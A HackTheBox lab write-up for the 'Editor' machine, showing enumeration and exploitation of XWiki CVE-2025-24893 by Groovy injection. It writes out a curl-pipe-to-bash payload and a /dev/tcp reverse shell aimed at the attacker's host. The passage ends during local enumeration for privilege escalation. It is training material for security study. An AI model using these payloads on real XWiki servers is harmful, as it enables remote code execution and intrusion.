---
render_with_liquid: false
title: HackTheBox Writeup - Editor
date: 2025-09-08 01:06:20 +1400
tags: [hackthebox, nmap, linux, feroxbuster, xwiki, java, cve-2025-24893, code-injection, enum, netdata, tunnel, chisel, discover-secrets, credentials-stuffing, cve-2024-32019, path-injection, suid, assembly]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f5d66d4-6fd5-4de0-808b-fd1568184c8e.png
    width: 640
    height: 480
---



`Editor` is an easy-difficulty Linux machine that focuses on web application exploitation followed by local privilege escalation. Initial enumeration reveals a web application exposing an `XWiki` instance, which is identified as vulnerable to `[CVE-2025-24893](https://nvd.nist.gov/vuln/detail/CVE-2025-24893)`, a remote code execution flaw in the `SolrSearch` endpoint. By adapting a public proof-of-concept, Groovy code injection is achieved, allowing arbitrary command execution and providing a shell as the xwiki user. Post-exploitation enumeration of the system reveals additional local users and misconfigurations that allow lateral movement to the user oliver. Further analysis of the system uncovers a privilege escalation vector involving a misconfigured `SUID binary` that relies on environment-controlled execution. By abusing `PATH` manipulation, a malicious binary is executed in place of a trusted system binary, resulting in execution with elevated privileges and ultimately granting root access.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ pt init '10.10.11.80 editor.htb wiki.editor.htb'
+---------+--------+-------------+-----------------+
| PROFILE | STATUS |     IP      |     DOMAIN      |
+---------+--------+-------------+-----------------+
| editor  | on     | 10.10.11.80 | editor.htb      |
| editor  | on     | 10.10.11.80 | wiki.editor.htb |
+---------+--------+-------------+-----------------+
```

## Nmap

```bash
# Nmap 7.95 scan initiated Mon Sep  8 01:06:19 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,8080, 10.10.11.80
Nmap scan report for 10.10.11.80
Host is up, received user-set (0.064s latency).
Scanned at 2025-09-08 01:06:20 CST for 9s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
|_http-server-header: Jetty(10.0.20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  8 01:06:29 2025 -- 1 IP address (1 host up) scanned in 9.99 seconds
```


## 80 - HTTP : SimplistCode Pro


### Info

```ruby
http://editor.htb [200] [Editor - SimplistCode Pro] [nginx/1.18.0 (Ubuntu)] [b39d31fbb2a7c1cd39da7136f17ca4444b39f092] [Nginx:1.18.0,Ubuntu]
```

![](/assets/obsidian/f139c7fc14ec4cb377fcf42a8f62db3f.png)

### Directory

```
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ URL="http://$(pt get rhost):80"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/dirb/wordlists/common.txt --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 400,404,500 -r -n -u "$URL" -o "ferox_${OUT}_common.txt"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://editor.htb:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 💢  Status Code Filters   │ [400, 404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_editor.htb-80_common.txt
 📂  Scan Dir Listings     │ true
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l      477w    16052c http://editor.htb/assets/index-DzxC4GL5.css
200      GET      147l     5460w   190349c http://editor.htb/assets/index-VRKEJlit.js
200      GET       15l       55w      631c http://editor.htb/
403      GET       13l       82w      564c http://editor.htb/assets/
200      GET       15l       55w      631c http://editor.htb/index.html
[####################] - 16s    16084/16084   0s      found:5       errors:0
[####################] - 16s    16059/16059   1026/s  http://editor.htb:80/ 
```


### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://$(pt get rhost)
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://editor.htb
[+] Method:                    GET
[+] Threads:                   100
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
wiki.editor.htb Status: 302 [Size: 0] [--> http://wiki.editor.htb/xwiki]
Progress: 100000 / 100000 (100.00%)
===============================================================
Finished
===============================================================
```


## 8080 - HTTP : Xwiki 15.10.8


### Info

- It's a documentation WIKI for the **app SimplelistCode Pro** from port `80`

```ruby
http://editor.htb:8080 [302,302,302,200] [XWiki - Main - Intro] [Jetty(10.0.20)] [6e1f44548fac8fdfee2e2caede9a4d25974992cf] [Bootstrap:3.4.1,Java,Jetty:10.0.20,Prototype,RequireJS,XWiki,jQuery:3.7.1]
```

![](/assets/obsidian/46ac3145682e61d705d72284601f490d.png)


### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ URL="http://$(pt get rhost):8080"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/dirb/wordlists/common.txt --scan-dir-listings -C 400,404,500 -n -u "$URL" -o "ferox_${OUT}_common.txt"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://editor.htb:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 💢  Status Code Filters   │ [400, 404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_editor.htb-8080_common.txt
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/inline => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01sanxtu716urn1xb7hkdcucwn92535.node0?srid=bkp5QOB5&xredirect=%2Fxwiki%2Fbin%2Finline%3Fsrid%3Dbkp5QOB5
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/ => http://editor.htb:8080/xwiki/bin/view/Main/
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/deletespace => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01105h5cs8o7kt11c91l8gfan182538.node0?srid=p0gXkmOh&xredirect=%2Fxwiki%2Fbin%2Fdeletespace%3Fsrid%3Dp0gXkmOh
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/lock => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node07amsysrcdggu19kaw6q6miwyx2542.node0?srid=tkN2bgMy&xredirect=%2Fxwiki%2Fbin%2Flock%3Fsrid%3DtkN2bgMy
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/objectsync => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01m3810ou8r4pv13jwyyhas4m7l2544.node0?srid=lugJaR7P&xredirect=%2Fxwiki%2Fbin%2Fobjectsync%3Fsrid%3DlugJaR7P
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/delattachment => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node04p0e5b3ix0atoyghyesrwwdm2541.node0?srid=ydltK7ra&xredirect=%2Fxwiki%2Fbin%2Fdelattachment%3Fsrid%3DydltK7ra
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/login => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin?xredirect=%2Fxwiki%2Fbin%2Fview%2FMain%2Flogin
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/propdisable => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01etxks8romlqcbviexl5c2llb2546.node0?srid=Z2qE7qOr&xredirect=%2Fxwiki%2Fbin%2Fpropdisable%3Fsrid%3DZ2qE7qOr
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/loginerror => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin?xredirect=%2Fxwiki%2Fbin%2Fview%2FMain%2Floginerror
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/undelete => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node05gfhrxghq6n1ss5vz2wqk4cs2549.node0?srid=FxQvzFph&xredirect=%2Fxwiki%2Fbin%2Fundelete%3Fsrid%3DFxQvzFph
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/propupdate => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node0ynf6mcujlgs9wkhrir1st0yo2550.node0?srid=RoNvvbhS&xredirect=%2Fxwiki%2Fbin%2Fpropupdate%3Fsrid%3DRoNvvbhS
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/cancel => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node0f09hf9l95mnz7kz1vl2mswif2552.node0?srid=9zSdYnAo&xredirect=%2Fxwiki%2Fbin%2Fcancel%3Fsrid%3D9zSdYnAo
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/attach => http://editor.htb:8080/xwiki/bin/view/Main/attach?viewer=attachments
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/rollback => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01wyxtghdvzn0g4vc51a301d5n2554.node0?srid=UnVwnLzE&xredirect=%2Fxwiki%2Fbin%2Frollback%3Fsrid%3DUnVwnLzE
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/propdelete => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node063apgcdku4e3nb5bx28y07oh2555.node0?srid=VWu4p2XP&xredirect=%2Fxwiki%2Fbin%2Fpropdelete%3Fsrid%3DVWu4p2XP
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/preview => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node0a80kt4kma9iz1xuxft6hcnzhf2558.node0?srid=qJIEhcDH&xredirect=%2Fxwiki%2Fbin%2Fpreview%3Fsrid%3DqJIEhcDH
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/propenable => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01c6o2vph26u6djhpare7x2et02559.node0?srid=C437gNDG&xredirect=%2Fxwiki%2Fbin%2Fpropenable%3Fsrid%3DC437gNDG
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/register => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node014phhbjm9pp6915ieuk9sgtqnv2560.node0?srid=PxmFehxC&xredirect=%2Fxwiki%2Fbin%2Fregister%3Fsrid%3DPxmFehxC
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/admin => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node09jihkr0pct001t2n1ipiek94p2563.node0?srid=pprAEodQ&xredirect=%2Fxwiki%2Fbin%2Fadmin%3Fsrid%3DpprAEodQ
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/objectadd => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node012esba98yjvnaovo4pxr43xus2562.node0?srid=2lb54zKB&xredirect=%2Fxwiki%2Fbin%2Fobjectadd%3Fsrid%3D2lb54zKB
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/commentsave => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01bdgzcazrw5nc1gcks9w9l59lw2566.node0?srid=g8wznYe2&xredirect=%2Fxwiki%2Fbin%2Fcommentsave%3Fsrid%3Dg8wznYe2
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/save => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01mboftozahjgk14ck29jfiuok22569.node0?srid=jlxo9yHb&xredirect=%2Fxwiki%2Fbin%2Fsave%3Fsrid%3Djlxo9yHb
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/objectremove => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node0rscfa5n0uqt71e9q1tz16u37l2568.node0?srid=qb1QVKlc&xredirect=%2Fxwiki%2Fbin%2Fobjectremove%3Fsrid%3Dqb1QVKlc
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/logout => http://editor.htb:8080/xwiki/bin/view/Main/;jsessionid=node01sto4o2sgxsq9teiupik9xnh82574.node0
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/commentadd => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node0s846cybp64f3rgd7gahbduqb2576.node0?srid=gCRxyAkF&xredirect=%2Fxwiki%2Fbin%2Fcommentadd%3Fsrid%3DgCRxyAkF
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/reset => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node0u5nq5sg9rypqnr224zi7sh1x2575.node0?srid=pAB7u3cX&xredirect=%2Fxwiki%2Fbin%2Freset%3Fsrid%3DpAB7u3cX
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/loginsubmit => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin?xredirect=%2Fxwiki%2Fbin%2Fview%2FMain%2Floginsubmit
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/saveandcontinue => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node05h6ats7g9z5nh0t4gk68n7t42577.node0?srid=gfMUB8VD&xredirect=%2Fxwiki%2Fbin%2Fsaveandcontinue%3Fsrid%3DgfMUB8VD
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/redirect => http://editor.htb:8080/xwiki/bin/view/Main/;jsessionid=node0ue5fq271d72r4phehbd3182572.node0
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/import => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node0oc6q872dlht0hvh2a2kawqoz2580.node0?srid=g1iHrfKN&xredirect=%2Fxwiki%2Fbin%2Fimport%3Fsrid%3Dg1iHrfKN
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/distribution => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01eev8yjpwvlq7c1c3hhjqgqlg2570.node0?srid=2XuXDBdR&xredirect=%2Fxwiki%2Fbin%2Fdistribution%3Fsrid%3D2XuXDBdR
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/edit => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node0wmtdjn8uyr7uisbtk4h8ozd82556.node0?srid=IGh0ETKN&xredirect=%2Fxwiki%2Fbin%2Fedit%3Fsrid%3DIGh0ETKN
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/upload => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node01emamy3mx1q0zvz4thvuzwz1t2584.node0?srid=iA5RgPHo&xredirect=%2Fxwiki%2Fbin%2Fupload%3Fsrid%3DiA5RgPHo
302      GET        0l        0w        0c http://editor.htb:8080/xwiki/bin/deleteversions => http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin;jsessionid=node014nqnp9tp8gpb1nwrdzwb5z9e72583.node0?srid=uck2F0OO&xredirect=%2Fxwiki%2Fbin%2Fdeleteversions%3Fsrid%3Duck2F0OO
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET      205l      459w    11737c http://editor.htb:8080/xwiki/bin/delete
403      GET      206l      462w    11880c http://editor.htb:8080/xwiki/bin/create
200      GET      457l      933w    22596c http://editor.htb:8080/xwiki/bin/viewrev
200      GET      387l     1286w    33078c http://editor.htb:8080/xwiki/bin/pdf
200      GET       58l      156w     1842c http://editor.htb:8080/robots.txt
```


# User Flag
---

## Shell as xwiki


### 8080 - XWiki 15.10.8 : Code injection (CVE-2025-24893)

- Google : `XWiki Debian 15.10.8 exploit`

> Research - https://www.offsec.com/blog/cve-2025-24893/

> POC - https://github.com/gunzf0x/CVE-2025-24893

> **CVE-2025-24893**
> 
> 
> XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. Any guest can perform arbitrary remote code execution through a request to `SolrSearch`. This impacts the confidentiality, integrity and availability of the whole XWiki installation.
> 
> To reproduce on an instance, without being logged in, go to `<host>/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20`. If there is an output, and the title of the RSS feed contains `Hello from search text:42`, then the instance is vulnerable. 
> 
> This vulnerability has been patched in XWiki 15.10.11, 16.4.1 and 16.5.0RC1. Users are advised to upgrade. Users unable to upgrade may edit `Main.SolrSearchMacros` in `SolrSearchMacros.xml` on line 955 to match the `rawResponse` macro in `macros.vm#L2824` with a content type of `application/xml`, instead of simply outputting the content of the feed.
{: .prompt-info }

```bash
cd exploit
git clone https://github.com/gunzf0x/CVE-2025-24893
cd CVE-2025-24893
```

Monitor ICMP packets

```bash
sudo tcpdump -i tun0 -n icmp -v
```

Attempt command execution on the target machine to ping back our host

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor/exploit/CVE-2025-24893]
└─$ python CVE-2025-24893.py -t http://editor.htb:8080/ -c 'bash -c {curl,10.10.14.34}|bash'
[*] Attacking http://editor.htb:8080/
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Bcurl%2C10.10.14.34%7D%7Cbash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
[*] Command executed

~Happy Hacking
```

- It injects a groovy script block to execute commands

```bash
┌──(bravosec㉿fsociety)-[~]
└─$ echo 'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Bcurl%2C10.10.14.34%7D%7Cbash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D' | urldecode
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}{{async async=false}}{{groovy}}"bash -c {curl,10.10.14.34}|bash".execute(){{/groovy}}{{/async}}
```

We've received the packets, which means command execution was successful

![](/assets/obsidian/60f508578786e78d3e28abb197ae4ecf.png)

Start a web server to host reverse shell script

```bash
PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; mkdir -p www && echo -e '#!/bin/sh\nsh -i >& /dev/tcp/10.10.14.34/1111 0>&1' > www/index.html && python -m http.server $PORT -d www
```

Start reverse shell listener

```bash
nc -lvnp 1111
```

Get reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ curl 'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss' -G --data-urlencode 'text=}}{{async async=false}}{{groovy}}"bash -c {curl,10.10.14.34}|bash".execute(){{/groovy}}{{/async}}'
<p>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;rss xmlns:dc="<span class="wikiexternallink"><a class="wikimodel-freestanding" href="http://purl.org/dc/elements/1.1/"><span class="wikigeneratedlinkcontent">http://purl.org/dc/elements/1.1/</span></a></span>" version="2.0"&gt;<br/>&nbsp;&nbsp;&lt;channel&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;RSS feed for search on [}}Process[pid=83140, exitValue="not exited"]]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span class="wikiexternallink"><a class="wikimodel-freestanding" href="http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Bcurl%2C10.10.14.34%7D%7Cbash%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"><span class="wikigeneratedlinkcontent">http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Bcurl%2C10.10.14.34%7D%7Cbash%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</span></a></span>&lt;/link&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;RSS feed for search on [}}Process[pid=83142, exitValue="not exited"]]&lt;/description&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;language&gt;en&lt;/language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;copyright /&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:creator&gt;XWiki&lt;/dc:creator&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:language&gt;en&lt;/dc:language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:rights /&gt;<br/>&nbsp;&nbsp;&lt;/channel&gt;<br/>&lt;/rss&gt;</p><div class="wikimodel-emptyline"></div><div class="wikimodel-emptyline"></div> 
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.11.80] 51140
sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
xwiki@editor:/usr/lib/xwiki-jetty$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
┌──(bravosec㉿fsociety)-[~/htb/Editor]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
xwiki@editor:/usr/lib/xwiki-jetty$ stty rows 24 columns 209
xwiki@editor:/usr/lib/xwiki-jetty$ id
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
xwiki@editor:/usr/lib/xwiki-jetty$
```


## Shell as oliver


### Enumeration

There's a user `oliver` with an interesting group `netdata`

```bash
xwiki@editor:/etc/xwiki$ for u in $(cat /etc/passwd | grep sh$ | cut -d":" -f1 2>/dev/null);do id $u;done 2>/dev/null | sort -unt '=' -k2
uid=0(root) gid=0(root) groups=0(root)
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

**netdata**'s assets are located in `/opt/netdata`

```bash
xwiki@editor:/etc/xwiki$ find / -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group 'netdata' -ls 2>/dev/null
    50081      4 drwxr-xr-x   6 netdata  netdata      4096 Jul  8 08:34 /opt/netdata/var
    50082      4 drwxr-xr-x   3 netdata  netdata      4096 Jul  8 08:34 /opt/netdata/var/cache
    50083      4 drwxr-xr-x   5 netdata  netdata      4096 Sep  7 09:31 /opt/netdata/var/cache/netdata
    50114   1680 -rw-r-----   1 netdata  netdata   1716224 Sep  7 17:21 /opt/netdata/var/cache/netdata/netdata-meta.db
[...]
```

Process list didn't show anything that can be related to `netdata`

```bash
xwiki@editor:/etc/xwiki$ ps auxfw5 | grep -vF '\_ ['
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
xwiki       1060  9.8 41.1 4292408 1649408 ?     Ssl  09:31  46:06 java --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.io=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.util.concurrent=ALL-UNNAMED -Xmx1024m -Dxwiki.data.dir=/var/lib/xwiki/data -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/xwiki/data -Djetty.home=jetty -Djetty.base=. -Dfile.encoding=UTF8 -Djetty.http.port=8080 -jar jetty/start.jar jetty.http.port=8080 STOP.KEY=xwiki STOP.PORT=8079
xwiki       1175  0.0  0.0   7372  1748 ?        S    09:31   0:10  \_ /bin/bash /usr/lib/xwiki-jetty/start_xwiki.sh
xwiki      84939  0.0  0.0   5772   988 ?        S    17:20   0:00  |   \_ sleep 1
[...]
```

That might because `/proc` was mounted with the option `hidepid=invisible`, so we don't have permissions to view other users' processes

```bash
xwiki@editor:/etc/xwiki$ cat /proc/mounts | grep proc
proc /proc proc rw,nosuid,relatime,hidepid=invisible 0 0
[...]
```

By googling `netdata default port`, we've found `19999`

![](/assets/obsidian/a9395929962b02a1411b191cb9a6cf34.png)

Port `19999` was indeed opened on localhost

```bash
xwiki@editor:/etc/xwiki$ ss -ltnpu | awk '$5 !~ /0.0.0.0|::/'
Netid State  Recv-Q Send-Q      Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0               127.0.0.1:8125       0.0.0.0:*
